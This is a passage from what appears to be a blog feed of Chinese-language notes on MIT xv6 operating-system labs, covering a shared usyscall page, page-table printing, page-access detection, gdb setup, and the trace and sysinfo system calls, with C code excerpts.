</p><p>原：系统调用-&gt;syscall()-&gt;将参数从用户虚拟地址传送到内核虚拟地址-&gt;获取pid-&gt;将返回值从内核虚拟地址传送到用户虚拟地址</p><p>新：创建进程-&gt;将pid写入共享内存-&gt;用户调用普通函数(位于ulib.c)即可读取（不必陷入内核）</p><p>在<code>memlayout.h</code>已经定义了<code>usyscall</code>在虚拟内存中的位置和数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> USYSCALL (TRAPFRAME - PGSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> pid;  <span class="comment">// Process ID</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>proc.h</code>将usyscall添加进结构体，因为进程要监控虚拟内存以及<code>回收虚拟内存</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">usyscall</span> *<span class="title">usyscall</span>;</span></span><br></pre></td></tr></table></figure><p>在<code>proc.c</code>先分配一段内存用于存放<code>usyscall</code>，然后赋值。</p><p>注意不能写在<code>p-&gt;pagetable = proc_pagetable(p);</code>前。因为在此函数内，我们需要将分配的内存映射到用户空间，包括我们实现的<code>usyscall</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> proc*</span><br><span class="line"><span class="title function_">allocproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  found:</span><br><span class="line">  p-&gt;pid = allocpid();</span><br><span class="line">  p-&gt;state = USED;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate a trapframe page.</span></span><br><span class="line">  <span class="keyword">if</span>((p-&gt;trapframe = (<span class="keyword">struct</span> trapframe *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span>((p-&gt;usyscall = (<span class="keyword">struct</span> usyscall *)kalloc()) == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;usyscall-&gt;pid = p-&gt;pid;<span class="comment">//赋值</span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">// An empty user page table.</span></span><br><span class="line">  p-&gt;pagetable = proc_pagetable(p);</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;pagetable == <span class="number">0</span>)&#123;</span><br><span class="line">    freeproc(p);</span><br><span class="line">    release(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们来编辑<code>proc_pagetable(p)</code>,可以仿照前面的代码，这里我将USYSCALL映射写在最后，如果映射失败，也需要将前面的成功映射去除。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pagetable_t</span></span><br><span class="line"><span class="title function_">proc_pagetable</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line"> ....</span><br><span class="line">  <span class="keyword">if</span>(mappages(pagetable, USYSCALL, PGSIZE,</span><br><span class="line">              (uint64)(p-&gt;usyscall), PTE_R | PTE_U) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">      uvmfree(pagetable,<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pagetable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当进程结束时，我们需要取消映射，修改<code>proc_freepagetable</code>，增加<code>uvmunmap(pagetable, USYSCALL, 1, 0);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">proc_freepagetable</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, USYSCALL, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmfree(pagetable, sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们去除了映射，就应当free掉内存,在<code>freeproc</code>释放掉<code>usyscall</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">freeproc</span><span class="params">(<span class="keyword">struct</span> proc *p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(p-&gt;trapframe)</span><br><span class="line">    kfree((<span class="type">void</span>*)p-&gt;trapframe);</span><br><span class="line">  p-&gt;trapframe = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span>(p-&gt;usyscall)<span class="comment">//free usyscall</span></span><br><span class="line">    kfree((<span class="type">void</span>*)p-&gt;usyscall);</span><br><span class="line">  p-&gt;usyscall = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span>(p-&gt;pagetable)</span><br><span class="line">    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们就完成这个lab，主要是加强了我们对内存页分配流程的理解。</p><p>首先要分配一页内存（4096kb），内核填充数据，将内存映射到用户的虚拟内存，此时操作系统和进程虽然有不同的虚拟地址，却能访问相同的数据。</p><p>进程结束后，内核取消映射（用户将无法通过虚拟地址访问数据），然后操作系统free内存，腾出空间给下一进程使用。</p><h3 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h3><p>lab要求是我们打印第一个进程（pid = 1）的虚拟内存空间地址，要求按三层页表结构逐层打印</p><p>首先，这是一个内核函数，我们需要在defs.h里填写该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vm.c</span></span><br><span class="line"><span class="type">void</span>            <span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span>)</span>;</span><br></pre></td></tr></table></figure><p>紧接着，我们在exec.c的对应位置添加函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line"><span class="keyword">if</span>(p-&gt;pid==<span class="number">1</span>) </span><br><span class="line">  vmprint(p-&gt;pagetable);</span><br><span class="line"><span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br></pre></td></tr></table></figure><p>这里借鉴<code>freewalk()</code>的递归调用，但是由于我们需要记录层数，在内核声明全局变量又不可取，因此这里采用包装函数，在外函数记录层数。</p><p>判断层数：</p><p>L1、L2：<code>有</code>效且<code>无</code>读写执行权限，程序显然不能修改虚拟内存的映射</p><p>L0：<code>有</code>效且<code>有</code>读写权限，L0属于真实地址，程序需要读写（执行）地址来实现操作。</p><p>若有效位PTE_V没有设置，则该页表不存在。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">vm_print_child</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++)&#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">    uint64 child = PTE2PA(pte);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>((pte &amp; PTE_V) &amp;&amp; (pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">//有效且无读、写或执行权限</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; ..&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: pte %p pa %p\n&quot;</span>,i, pte,  child);</span><br><span class="line">      vm_print_child((<span class="type">pagetable_t</span>)child, level+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pte &amp; PTE_V) <span class="comment">//到达第三级页表，有效且有读写权限为分配好的页，打印树</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; ..&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: pte %p pa %p\n&quot;</span>,i, pte,  child);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>,pagetable);</span><br><span class="line">  vm_print_child(pagetable, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Detect-which-pages-have-been-accessed"><a href="#Detect-which-pages-have-been-accessed" class="headerlink" title="Detect which pages have been accessed"></a>Detect which pages have been accessed</h3><p>这个lab要求我们判断多个连续内存页中哪个内存页会被修改，返回掩码。</p><p>当该内存被访问时，硬件分页步行器会在PTE标记PTE_A，表示该页被访问到。</p><p>如图，PTE_A在第6位，我们修改riscv.h文件,定义宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_A (1L &lt;&lt; 6)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SCAN_PAGE 32    <span class="comment">//int为32位</span></span></span><br></pre></td></tr></table></figure><p>紧接着我们利用<code>argaddr</code>和<code>argint</code>读入参数，使用walk函数（<code>defs.h未定义，需要extern</code>）遍历内存地址，然后对返回的pte进行<code>PTE_A</code>判断，判断后要将<code>PTE_A</code>置0，防止影响下次调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LAB_PGTBL</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">pte_t</span> * <span class="title function_">walk</span><span class="params">(<span class="type">pagetable_t</span>, uint64, <span class="type">int</span>)</span>;  <span class="comment">//别忘了extern</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">sys_pgaccess</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// lab pgtbl: your code here.</span></span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  uint64 buf, addr;</span><br><span class="line">  <span class="type">int</span> mask = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(<span class="number">0</span>, &amp;buf) &lt; <span class="number">0</span> ||argint(<span class="number">1</span>, &amp;n) &lt; <span class="number">0</span> || argaddr(<span class="number">2</span>, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span>(n &lt;= <span class="number">0</span> || n &gt; MAX_SCAN_PAGE)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(p-&gt;pagetable, buf + i*PGSIZE, <span class="number">0</span>))==<span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;pgaccess: walk failed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(*pte&amp;PTE_A)</span><br><span class="line">        &#123;</span><br><span class="line">          mask |= (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">          *pte &amp;= (~PTE_A);</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;                                                                         </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyout(p-&gt;pagetable, addr, (<span class="type">char</span> *)&amp;mask, <span class="keyword">sizeof</span>(<span class="type">int</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>PTE_A标志位的作用：通过PTE_A可以判断是否被经常访问，否则可以放入磁盘节省珍贵的物理内存,内存交换</p><h4 id="Simplify"><a href="#Simplify" class="headerlink" title="Simplify"></a>Simplify</h4><p>//TODO</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x2</title>
      <link href="/2024/06/29/OS/xv6_0x2/"/>
      <url>/2024/06/29/OS/xv6_0x2/</url>
      
        <content type="html"><![CDATA[<h1 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h1><p><strong>TOPIC：</strong></p><ul><li><p>ISOLATION：将资源抽象为服务。我们需要控制应用权限，防止应用程序间的相互影响，定期让应用程序让出cpu…</p></li><li><p>KERNEL/USER MODE：隔离操作系统内核和用户应用程序。</p></li><li><p>SYSTEM CALL：从用户态转到内核态。通过<code>ECALL指令</code>并传入<code>系统调用号</code>实现。</p></li></ul><p>RISCV模式：用户模式，监督者模式，机器模式。</p><p>硬件对隔离的支持</p><ul><li>硬件可以通过寄存器的一个位判断当前模式，以允许执行特权指令。</li><li>硬件通过虚拟内存限制进程可以访问的内存空间。</li></ul><p>宏内核与微内核:</p><ul><li><p>宏内核：将所有操作系统服务都运行在内核模式中。</p><ul><li>优点：较好的性能，如应用程序与文件系统交互，只需进入一次内核。</li><li>缺点：易产生BUG，且一旦产生bug极可能导致内核崩溃。</li></ul></li><li><p>微内核：内核模式只提供基础支持，将文件系统等功能作为普通应用程序运行</p><ul><li>优点：较少的BUG，某功能崩溃可尝试重启。</li><li>缺点：性能欠佳，如应用程序与文件系统交互，应用程序需要先跳转进内核，再从内核跳转进文件系统用户程序。</li></ul></li></ul><h3 id="gdb配置"><a href="#gdb配置" class="headerlink" title="gdb配置"></a>gdb配置</h3><p>首先将gdb配置输出到~/.gdbinit。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;add-auto-load-safe-path /home/randolfluo/Desktop/xv6/xv6-labs-2020/.gdbinit &quot;</span> &gt;&gt; ~/.gdbinit</span><br><span class="line">gdb-multiarch   </span><br></pre></td></tr></table></figure><p>然后tmux打开两个窗口，分别运行xv6和gdb即可进行远程调试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0]:make qemu-gdb</span><br><span class="line">[1]:gdb-multiarch</span><br></pre></td></tr></table></figure><h3 id="System-calls"><a href="#System-calls" class="headerlink" title="System calls"></a>System calls</h3><p>下面两个实验主要是让我们熟悉系统调用的过程：</p><h4 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h4><p>在usyc.pl添加进入syscall的入口，编译时会将该入口编译为汇编指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry(<span class="string">&quot;trace&quot;</span>);</span><br></pre></td></tr></table></figure><p>在user.h添加系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">trace</span><span class="params">(<span class="type">int</span>)</span>;</span><br></pre></td></tr></table></figure><p>在sysproc.c添加，参数获取用argint函数，获取保存在<code>trapframe</code>寄存器的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_trace</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  argint(<span class="number">0</span>,&amp;n);   <span class="comment">//接收参数</span></span><br><span class="line">  myproc()-&gt;mask = n;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在proc.h中的进程结构体添加掩码，记录该进程是否需要追踪</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="type">int</span> mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在syscall.h添加宏定义，定义系统调用号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_trace  22</span></span><br></pre></td></tr></table></figure><p>在syscall.c添加对应输出函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_trace</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">......</span><br><span class="line">[SYS_trace]   sys_trace,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> *sys_name[]=&#123;</span><br><span class="line">    [SYS_fork]    <span class="string">&quot;fork&quot;</span>,</span><br><span class="line">    [SYS_exit]    <span class="string">&quot;exit&quot;</span>,</span><br><span class="line">    [SYS_wait]    <span class="string">&quot;wait&quot;</span>,</span><br><span class="line">    [SYS_pipe]    <span class="string">&quot;pipe&quot;</span>,</span><br><span class="line">    [SYS_read]    <span class="string">&quot;read&quot;</span>,</span><br><span class="line">    [SYS_kill]    <span class="string">&quot;kill&quot;</span>,</span><br><span class="line">    [SYS_exec]    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    [SYS_fstat]   <span class="string">&quot;fstat&quot;</span>,</span><br><span class="line">    [SYS_chdir]   <span class="string">&quot;chdir&quot;</span>,</span><br><span class="line">    [SYS_dup]     <span class="string">&quot;dup&quot;</span>,</span><br><span class="line">    [SYS_getpid]  <span class="string">&quot;getpid&quot;</span>,</span><br><span class="line">    [SYS_sbrk]    <span class="string">&quot;sbrk&quot;</span>,</span><br><span class="line">    [SYS_sleep]   <span class="string">&quot;sleep&quot;</span>,</span><br><span class="line">    [SYS_uptime]  <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">    [SYS_open]    <span class="string">&quot;open&quot;</span>,</span><br><span class="line">    [SYS_write]   <span class="string">&quot;write&quot;</span>,</span><br><span class="line">    [SYS_mknod]   <span class="string">&quot;mknod&quot;</span>,</span><br><span class="line">    [SYS_unlink]  <span class="string">&quot;unlink&quot;</span>,</span><br><span class="line">    [SYS_link]    <span class="string">&quot;link&quot;</span>,</span><br><span class="line">    [SYS_mkdir]   <span class="string">&quot;mkdir&quot;</span>,</span><br><span class="line">    [SYS_close]   <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    [SYS_trace]   <span class="string">&quot;trace&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//修改syscall添加掩码判断</span></span><br><span class="line"> <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">    <span class="keyword">if</span>((<span class="number">1</span> &lt;&lt; num) &amp; p-&gt;mask)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, sys_name[num], p-&gt;trapframe-&gt;a0);   <span class="comment">//a0寄存器存储返回值</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在proc.c中的fork()函数设置子进程继承掩码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(voide)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">// Cause fork to return 0 in the child.</span></span><br><span class="line"> np-&gt;trapframe-&gt;a0 = <span class="number">0</span>;</span><br><span class="line"> np-&gt;mask = p-&gt;mask;   <span class="comment">//继承掩码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后在makefile中将trace添加进编译选项。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$U/_trace\</span><br></pre></td></tr></table></figure><p>通过实验总结，我们可以发现trace实际是通过设置进程结构体中的标志位来标记进程中需要跟踪的系统调用，并通过在fork()中继承标记位来实现对子进程的追踪。最后在每次调用syscall检查对应掩码输出调用信息。</p><h4 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h4><p>和trace差不多的修改程序，但是我们需要自己创建两个函数</p><p>先修改系统调用入口usys.pl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry(<span class="string">&quot;sysinfo&quot;</span>);</span><br></pre></td></tr></table></figure><p>在user.h添加添加声明，提供用户接口</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span>;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sysinfo</span><span class="params">(<span class="keyword">struct</span> sysinfo *)</span>; </span><br></pre></td></tr></table></figure><p>在syscall.h添加系统调用号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sysinfo 23</span></span><br></pre></td></tr></table></figure><p>在syscall.c添加<code>SYS_sysinfo</code>到trace追踪里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> uint64 <span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="type">void</span>)</span> = &#123;</span><br><span class="line">....</span><br><span class="line">[SYS_sysinfo] sys_sysinfo,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *sys_name[]=&#123;</span><br><span class="line">  ...</span><br><span class="line">    [SYS_sysinfo] <span class="string">&quot;sysinfo&quot;</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在proc.c添加获取进程数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 